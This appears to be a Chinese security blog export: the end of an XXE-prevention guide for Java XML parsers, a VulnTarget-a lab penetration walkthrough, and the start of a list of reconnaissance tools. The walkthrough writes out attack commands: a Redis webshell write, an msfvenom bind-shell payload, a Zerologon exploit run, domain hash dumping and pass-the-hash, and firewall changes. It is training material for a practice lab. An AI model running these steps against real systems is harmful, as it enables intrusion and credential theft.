<p>为了保护一个 <code>javax.xml.validation.SchemaFactory</code>来自 XXE，请执行以下操作：</p>
<h4 id="SchemaFactory"><a href="#SchemaFactory" class="headerlink" title="SchemaFactory"></a>SchemaFactory</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SchemaFactory factory = SchemaFactory.newInstance(&quot;http://www.w3.org/2001/XMLSchema&quot;);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);</span><br><span class="line">Schema schema = factory.newSchema(Source);</span><br></pre></td></tr></table></figure>

<p>为了保护一个 <code>javax.xml.transform.sax.SAXTransformerFactory</code>来自 XXE，请执行以下操作：</p>
<h4 id="SAXTransformerFactory"><a href="#SAXTransformerFactory" class="headerlink" title="SAXTransformerFactory"></a>SAXTransformerFactory</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAXTransformerFactory sf = SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;&quot;);</span><br><span class="line">sf.newXMLFilter(Source);</span><br></pre></td></tr></table></figure>

<p>保护 Java <code>org.xml.sax.XMLReader</code>来自 XXE，请执行以下操作：</p>
<h4 id="XMLReader"><a href="#XMLReader" class="headerlink" title="XMLReader"></a>XMLReader</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XMLReader reader = XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">reader.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span><br><span class="line">reader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">reader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br></pre></td></tr></table></figure>

<p>保护 Java <code>org.dom4j.io.SAXReader</code>来自 XXE，请执行以下操作：</p>
<h4 id="saxReader"><a href="#saxReader" class="headerlink" title="saxReader"></a>saxReader</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">saxReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">saxReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">saxReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br></pre></td></tr></table></figure>

<p>保护 Java <code>org.jdom2.input.SAXBuilder</code>来自 XXE，请执行以下操作：</p>
<h4 id="SAXBuilder"><a href="#SAXBuilder" class="headerlink" title="SAXBuilder"></a>SAXBuilder</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAXBuilder builder = new SAXBuilder();</span><br><span class="line">builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);</span><br><span class="line">builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">builder.setExpandEntities(false);</span><br><span class="line">Document doc = builder.build(new File(fileName));</span><br></pre></td></tr></table></figure>

<p>对于需要 <code>EntityResolver</code>，您可以通过 来抵消 XML 解析器解析实体的能力:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public final class NoOpEntityResolver implements EntityResolver &#123;</span><br><span class="line">  public InputSource resolveEntity(String publicId, String systemId) &#123;</span><br><span class="line">      return new InputSource(new StringReader(&quot;&quot;));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlReader.setEntityResolver(new NoOpEntityResolver());</span><br><span class="line">documentBuilder.setEntityResolver(new NoOpEntityResolver());</span><br></pre></td></tr></table></figure>

<p>或更简单地说：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EntityResolver noop = (publicId, systemId) -&gt; new InputSource(new StringReader(&quot;&quot;));</span><br><span class="line">xmlReader.setEntityResolver(noop);</span><br><span class="line">documentBuilder.setEntityResolver(noop);</span><br></pre></td></tr></table></figure>

<p>由于一个 <code>javax.xml.bind.Unmarshaller</code>解析 XML 并且不支持任何禁用 XXE 的标志，必须首先通过可配置的安全解析器解析不受信任的 XML，作为结果生成源对象，并将源对象传递给 Unmarshaller。 例如：</p>
<h4 id="Unmarshaller"><a href="#Unmarshaller" class="headerlink" title="Unmarshaller"></a>Unmarshaller</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">spf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span><br><span class="line">Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(),</span><br><span class="line">      new InputSource(new StringReader(xml)));</span><br><span class="line">JAXBContext jc = JAXBContext.newInstance(Object.class);</span><br><span class="line">Unmarshaller um = jc.createUnmarshaller();</span><br><span class="line">um.unmarshal(xmlSource);</span><br></pre></td></tr></table></figure>

<p>一种 <code>javax.xml.xpath.XPathExpression</code>无法自行安全配置，因此不可信数据必须先通过另一个安全的 XML 解析器进行解析</p>
<h4 id="XPathExpression"><a href="#XPathExpression" class="headerlink" title="XPathExpression"></a>XPathExpression</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();</span><br><span class="line">df.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span><br><span class="line">df.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);</span><br><span class="line">DocumentBuilder builder = df.newDocumentBuilder();</span><br><span class="line">String result = new XPathExpression().evaluate( builder.parse(</span><br><span class="line">    new ByteArrayInputStream(xml.getBytes())) );</span><br></pre></td></tr></table></figure>

<p><strong>java.beans.XMLDecoder</strong></p>
<p>的 readObject() 此类中 方法从根本上是不安全的。</p>
<p>不仅它解析的 XML 受 XXE 约束，而且该方法可用于构造任何 Java 对象，并 执行此处描述的任意代码 。</p>
<p>除了信任或正确验证传递给它的输入之外，没有办法安全地使用这个类。</p>
<p>因此，我们强烈建议完全避免使用此类，并使用本备忘单中其他地方所述的安全或正确配置的 XML 解析器替换它。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html</a></p>
<p><a href="https://blog.csdn.net/weixin_45382656/article/details/118565084?spm=1001.2014.3001.5501">https://blog.csdn.net/weixin_45382656/article/details/118565084?spm=1001.2014.3001.5501</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnTarget-a 靶场渗透测试</title>
    <url>/2022/03/11/VulnTarget-a%20%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h2 id="一、靶机信息"><a href="#一、靶机信息" class="headerlink" title="一、靶机信息"></a>一、靶机信息</h2><span id="more"></span>

<p>网络拓扑图</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224172048276-1349065730.png" alt="image-20220224172048057"></p>
<p>攻击机：kali-192.168.12.128</p>
<p>win7：账号：win7；密码：admin</p>
<p>win-2016：账号：Administrator；密码：Admin@123</p>
<p>win-2019:账号：administrator；密码：Admin@666</p>
<p>靶场下载地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">链接: https://pan.baidu.com/s/195iUmvbaKOhtn2S_O-F6TA 提取码: jnkq</span><br></pre></td></tr></table></figure>

<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p><code>nmap</code>扫描一下端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -A 192.168.12.136 </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 03:20 EST</span><br><span class="line">Nmap scan report for 192.168.12.136</span><br><span class="line">Host is up (0.00077s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">80/tcp  open  http         nginx</span><br><span class="line">|_http-title: \xCD\xA8\xB4\xEFOA\xCD\xF8\xC2\xE7\xD6\xC7\xC4\xDC\xB0\xEC\xB9\xAB\xCF\xB5\xCD\xB3</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 00:0C:29:B6:97:9F (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows Vista|2008|7</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_7</span><br><span class="line">OS details: Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: WIN7-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: win7-PC</span><br><span class="line">|   NetBIOS computer name: WIN7-PC\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2022-02-24T16:20:29+08:00</span><br><span class="line">|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: WIN7-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:b6:97:9f (VMware)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-02-24T08:20:29</span><br><span class="line">|_  start_date: 2022-02-24T07:19:44</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.77 ms 192.168.12.136</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 54.05 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据扫描的结果，得知win7开启了SMB服务，可能存在ms1-7010，用nmap进行漏洞扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script=vuln 192.168.12.136 -p 445,139,135 -T4 -v </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 03:46 EST</span><br><span class="line">NSE: Loaded 105 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 10.00s elapsed</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 03:46</span><br><span class="line">Scanning 192.168.12.136 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 03:46, 0.06s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 03:46</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 03:46, 0.01s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 03:46</span><br><span class="line">Scanning 192.168.12.136 [3 ports]</span><br><span class="line">Discovered open port 139/tcp on 192.168.12.136</span><br><span class="line">Discovered open port 445/tcp on 192.168.12.136</span><br><span class="line">Discovered open port 135/tcp on 192.168.12.136</span><br><span class="line">Completed SYN Stealth Scan at 03:46, 1.14s elapsed (3 total ports)</span><br><span class="line">NSE: Script scanning 192.168.12.136.</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 14.99s elapsed</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Nmap scan report for 192.168.12.136</span><br><span class="line">Host is up (0.00062s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:0C:29:B6:97:9F (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 26.91 seconds</span><br><span class="line">           Raw packets sent: 6 (248B) | Rcvd: 4 (160B)</span><br></pre></td></tr></table></figure>

<p>扫出存在ms17-010，且80端口开启了http服务</p>
<h2 id="三、通达OA-Getshell"><a href="#三、通达OA-Getshell" class="headerlink" title="三、通达OA-Getshell"></a>三、通达OA-Getshell</h2><p>访问80端口，是一个通达OA系统</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224180349959-1667979959.png" alt="image-20220224180348215"></p>
<p>直接上通达OA综合利用工具</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224180450264-1792432834.png" alt="image-20220224180450014"></p>
<p>上传webshell，后使用蚁剑相连</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224190238933-863110053.png" alt="image-20220224190238677"></p>
<h2 id="四、ms17-010"><a href="#四、ms17-010" class="headerlink" title="四、ms17-010"></a>四、ms17-010</h2><p>使用exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue，设置好ip</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110354482-370777190.png" alt="image-20220225110354133"></p>
<p>获取密码</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110621623-777957063.png" alt="image-20220225110622088"></p>
<p>发现内网网段</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110725843-1000787767.png" alt="image-20220225110726376"></p>
<p>进程迁移 run post&#x2F;windows&#x2F;manage&#x2F;migrate </p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225111356795-1313355061.png" alt="image-20220225111357560"></p>
<p>添加路由 run post&#x2F;multi&#x2F;manage&#x2F;autoroute </p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225111701747-1624666354.png" alt="image-20220225111702604"></p>
<p>扫描另一个网段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set ports 22,23,80,443,8080,8081,3389,445,143,6379</span><br><span class="line">ports =&gt; 22,23,80,443,8080,8081,3389,445,143,6379</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set rhosts 10.0.20.0/24</span><br><span class="line">rhosts =&gt; 10.0.20.0/24</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225112650421-901340987.png" alt="image-20220225112650988"></p>
<p>设置代理 use auxiliary&#x2F;server&#x2F;socks_proxy</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225114131297-1320655720.png" alt="image-20220225114131843"></p>
<p>扫描目录发现phpinfo.php，访问得到网站的绝对路径 C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW </p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132259717-246697551.png" alt="image-20220225132300461"></p>
<h2 id="五、Redis未授权"><a href="#五、Redis未授权" class="headerlink" title="五、Redis未授权"></a>五、Redis未授权</h2><p>根据前面端口扫描的结果，发现10.0.20.99开放6379端口，为redis服务，连接redis服务端</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132358885-169890561.png" alt="image-20220225132359703"></p>
<p>前面知道了web的绝对路径，就可以尝试写webshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config set dir &quot;C:/phpStudy/PHPTutorial/WWW/&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set 1 &quot;&lt;?php @eval($_POST[&#x27;xt&#x27;]);?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132545506-441461470.png" alt="image-20220225132546411"></p>
<p>成功写入</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132627451-134243051.png" alt="image-20220225132628431"></p>
<p>配置蚁剑的代理</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132918058-500776476.png" alt="image-20220225132918931"></p>
<p>连接webshell</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132954621-1024961877.png" alt="image-20220225132955428"></p>
<p>发现另一个内网IP10.0.10.111</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225133312093-1879231647.png" alt="image-20220225133311482"></p>
<p>上线msf </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp  LPORT=8090 -f exe &gt; bind_8090.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225141445075-1184723408.png" alt="image-20220225141444539"></p>
<p>通过蚂剑上传exe</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145547529-1362028343.png" alt="image-20220225145546791"></p>
<p>msf设置监听</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145657518-2077326036.png" alt="image-20220225145656812"></p>
<p>关闭防火墙</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145724406-1568966848.png" alt="image-20220225145724001"></p>
<p>运行exe，可以看到上线msf成功</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145805889-782803992.png" alt="image-20220225145805449"></p>
<p>加载kiwi，进行进程迁移</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145925039-1401644437.png" alt="image-20220225145924483"></p>
<p>查看HTLM</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150027820-1217638930.png" alt="image-20220225150027261"></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150132856-1497488849.png" alt="image-20220225150132278"></p>
<p>破解密码，得知win2016的密码为Admin@123</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150258857-904011230.png" alt="image-20220225150258263"></p>
<p>查看域控制器计算机名</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150517118-936221546.png" alt="image-20220225150516700"></p>
<p>查看域管理员</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150543950-1336172595.png" alt="image-20220225150543586"></p>
<p>得到域控制器的IP为10.0.10.110</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150618111-137306728.png" alt="image-20220225150617712"></p>
<p>添加路由 run post&#x2F;multi&#x2F;manage&#x2F;autoroute </p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150721610-1227593958.png" alt="image-20220225150721108"></p>
<h2 id="六、CVE-2020-1472提权"><a href="#六、CVE-2020-1472提权" class="headerlink" title="六、CVE-2020-1472提权"></a>六、CVE-2020-1472提权</h2><p>因为拿到的是域普通用户的权限，直接上1472</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225152834006-1262917074.png" alt="image-20220225152833403"></p>
<p>此时密码已置空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python secretsdump.py  vulntarget.com/WIN2019\$@10.0.10.110  -just-dc -no-pass</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225152850109-4254443.png" alt="image-20220225152849412"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110</span><br></pre></td></tr></table></figure>

<p>成功访问域控</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225153425556-447460473.png" alt="image-20220225153424916"></p>
<p>破解hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/nmap/nselib/data/passwords.lst hash.txt --format=NT</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225154241871-1129294273.png" alt="image-20220225154241357"></p>
<p>开启远程桌面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225154445468-1141645458.png" alt="image-20220225154444872"></p>
<p>上线msf，先关闭防火墙策略</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;bind tcp&quot; protocol=TCP dir=in localport=8090 action=allow</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155030667-1311091733.png" alt="image-20220225155030184"></p>
<p>运行exe，上线成功</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155107644-2051212924.png" alt="image-20220225155107107"></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155139792-2008698039.png" alt="image-20220225155139347"></p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>vulntarget</tag>
      </tags>
  </entry>
  <entry>
    <title>常用的信息收集工具</title>
    <url>/2022/03/31/%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h3><h4 id="爱站、站长工具"><a href="#爱站、站长工具" class="headerlink" title="爱站、站长工具"></a>爱站、站长工具</h4><p>SEO综合查询：根据域名来收集目标站点的备案信息、名称、注册人等信息</p>
<span id="more"></span>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331234824808-1321230515.png" alt="image-20220331234824770"></p>
<p>ICP备案查询：可以查询该单位备案的其它网站</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235548245-1513379625.png" alt="image-20220331235548490"></p>
<p>Whois查询：可以通过域名、邮箱、注册人查询目标信息，或者通过Whois反查获取更多的信息</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235812621-1264700791.png" alt="image-20220331235812791"></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235833979-743434060.png" alt="image-20220331235834229"></p>
<h4 id="天眼查、企查查"><a href="#天眼查、企查查" class="headerlink" title="天眼查、企查查"></a>天眼查、企查查</h4><p>天眼查：根据前面获取的企业名称可以获取目标企业的微信公众号、微博、备案站点、APP、软件著作权等信息。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401001038436-305034698.png" alt="image-20220401001038521"></p>
<h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><ul>
<li>OneForAll：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 oneforall.py --target xxx.cn run</span><br></pre></td></tr></table></figure>

<ul>
<li>JSFinder：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 JSFinder.py -u http://www.xxx.cn -d -ou JSurl.txt -os JSdomain.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>Layer</li>
<li>subDomainsBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python subDomainsBrute.py -t 10 xxx.cn -o xxx.cn.txt</span><br><span class="line">python subDomainsBrute.py -t 10 --full xxx.cn -o xxx.cn.txt //全扫描</span><br></pre></td></tr></table></figure>

<ul>
<li><p>dnsub：<a href="https://github.com/yunxu1/dnsub/">https://github.com/yunxu1/dnsub/</a></p>
</li>
<li><p>Findomain：<a href="https://github.com/Findomain/Findomain">https://github.com/Findomain/Findomain</a></p>
</li>
<li><p>subdomain3：<a href="https://github.com/yanxiu0614/subdomain3">https://github.com/yanxiu0614/subdomain3</a></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python brutedns.py -d tagetdomain -s high -l 5</span><br></pre></td></tr></table></figure>

<ul>
<li>Sublist3r：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sublist3r.py -d 6pian.cn -o xxx.cn-sublist3r.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>DNSdumpster：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li>
<li>在线域名爆破：<a href="http://z.zcjun.com/">http://z.zcjun.com</a></li>
<li>小蓝本：<a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></li>
<li>谷歌语法：site:url.com</li>
</ul>
<h3 id="APP信息收集"><a href="#APP信息收集" class="headerlink" title="APP信息收集"></a>APP信息收集</h3><ul>
